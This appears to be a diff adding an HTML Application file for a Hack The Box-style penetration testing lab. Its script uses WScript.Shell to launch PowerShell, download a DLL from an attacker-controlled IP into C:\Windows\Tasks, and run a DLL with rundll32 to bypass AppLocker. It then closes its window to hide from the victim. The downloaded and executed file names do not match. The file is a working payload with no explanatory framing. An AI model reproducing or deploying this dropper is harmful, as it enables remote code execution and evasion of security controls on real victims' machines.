@@ -1,0 +1,16 @@
+
+<html>
+<head>
+<script language="JScript">
+	var shell = new ActiveXObject("WScript.Shell");
+	// There is more ways to bypass AppLocker, it depends of what programs are blocked: Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+	var first = shell.Run("powershell.exe -Command \"wget http://10.10.14.14/shell_htb.dll -OutFile C:\\Windows\\Tasks\\shell_htb.dll;\"; rundll32 C:\\Windows\\Tasks\\met_htb.dll,run");
+</script>
+</head>
+<body>
+<script language="JScript">
+	self.close();
+</script>
+</body>
+</html>
+
